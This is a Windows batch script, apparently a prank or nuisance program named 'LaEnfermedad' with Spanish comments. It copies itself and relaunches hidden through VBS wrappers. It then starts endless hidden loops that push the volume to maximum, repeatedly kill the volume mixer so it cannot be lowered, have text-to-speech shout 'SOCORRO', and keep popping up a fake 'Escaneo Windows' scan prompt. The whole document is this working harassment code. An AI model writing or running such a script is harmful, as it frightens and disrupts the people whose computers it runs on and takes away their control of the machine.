md %userprofile%\Downloads\carpeta
copy LaEnfermedad.bat %userprofile%\Downloads\carpeta
IF EXIST %userprofile%\Downloads\carpeta\oculto.vbs goto in
echo CreateObject("Wscript.Shell").Run "%userprofile%\Downloads\carpeta\LaEnfermedad.bat", 0, True >%userprofile%\Downloads\carpeta\oculto.vbs
start %userprofile%\Downloads\carpeta\oculto.vbs
exit
:in
rem Subir volumen al maximo
echo set oShell = CreateObject("WScript.Shell") >> %userprofile%\Downloads\carpeta\volumenmaximo.vbs
echo oShell.run"%SystemRoot%\System32\SndVol.exe" >> %userprofile%\Downloads\carpeta\volumenmaximo.vbs
echo WScript.Sleep 1500 'Waits For The Program To Open >> %userprofile%\Downloads\carpeta\volumenmaximo.vbs
echo oShell.SendKeys("{PGUP}") >> %userprofile%\Downloads\carpeta\volumenmaximo.vbs
echo oShell.SendKeys("{PGUP}") >> %userprofile%\Downloads\carpeta\volumenmaximo.vbs
echo oShell.SendKeys("{PGUP}") >> %userprofile%\Downloads\carpeta\volumenmaximo.vbs
echo oShell.SendKeys("{PGUP}") >> %userprofile%\Downloads\carpeta\volumenmaximo.vbs
echo oShell.SendKeys("{PGUP}") >> %userprofile%\Downloads\carpeta\volumenmaximo.vbs
rem Creacion de las voces
echo Option Explicit >> %userprofile%\Downloads\carpeta\voice.vbs 
echo Dim David >> %userprofile%\Downloads\carpeta\voice.vbs 
echo 'David's Voice >> %userprofile%\Downloads\carpeta\voice.vbs 
echo Set David = CreateObject("SAPI.spVoice") >> %userprofile%\Downloads\carpeta\voice.vbs 
echo Set David.Voice = David.GetVoices.Item(0) >> %userprofile%\Downloads\carpeta\voice.vbs 
echo David.Rate = 2 >> %userprofile%\Downloads\carpeta\voice.vbs 
echo David.Volume = 100 >> %userprofile%\Downloads\carpeta\voice.vbs 
echo David.Speak "SOCORRO" >> %userprofile%\Downloads\carpeta\voice.vbs
rem BUCLE VOCES.bat
echo :invoice > %userprofile%\Downloads\carpeta\buclevoicebat.bat
echo start %userprofile%\Downloads\carpeta\voice.vbs >> %userprofile%\Downloads\carpeta\buclevoicebat.bat
echo timeout 2 %userprofile%\Downloads\carpeta\voice.vbs >> %userprofile%\Downloads\carpeta\buclevoicebat.bat
echo goto invoice >> %userprofile%\Downloads\carpeta\buclevoicebat.bat
rem BUCLE voices.vbs
echo CreateObject("Wscript.Shell").Run "%userprofile%\Downloads\carpeta\buclevoicebat.bat", 0, True > %userprofile%\Downloads\carpeta\ocultobuclevoice.vbs
rem ALERTA DE AVISOS avisos.vbs 
echo X=MsgBox("Quieres escanear el ordenador?",3+48,"Escaneo Windows") >> %userprofile%\Downloads\carpeta\avisos.vbs 
rem bucle.bat de avisos.vbs
echo :in  >> %userprofile%\Downloads\carpeta\bucle.bat 
echo start %userprofile%\Downloads\carpeta\avisos.vbs  >> %userprofile%\Downloads\carpeta\bucle.bat
echo timeout 1  >> %userprofile%\Downloads\carpeta\bucle.bat 
echo goto :in  >> %userprofile%\Downloads\carpeta\bucle.bat 
rem BUCLE VBS DE AVISOS ocultobucle.vbs
echo CreateObject("Wscript.Shell").Run "%userprofile%\Downloads\carpeta\bucle.bat", 0, True > %userprofile%\Downloads\carpeta\ocultobucle.vbs
rem BUCLE DE TASKKILL buclekill.bat
echo :in > %userprofile%\Downloads\carpeta\buclekill.bat
echo taskkill /im SndVol.exe >> %userprofile%\Downloads\carpeta\buclekill.bat
echo goto :in >> %userprofile%\Downloads\carpeta\buclekill.bat
rem VBS DE BUCLEKILL ocultobuclekill.vbs
echo CreateObject("Wscript.Shell").Run "%userprofile%\Downloads\carpeta\buclekill.bat", 0, True > %userprofile%\Downloads\carpeta\ocultobuclekill.vbs
rem Iniciar programas
start %userprofile%\Downloads\carpeta\volumenmaximo.vbs
timeout 3
start %userprofile%\Downloads\carpeta\ocultobuclekill.vbs
start %userprofile%\Downloads\carpeta\voice.vbs
start %userprofile%\Downloads\carpeta\ocultobucle.vbs
start %userprofile%\Downloads\carpeta\ocultobuclevoice.vbs
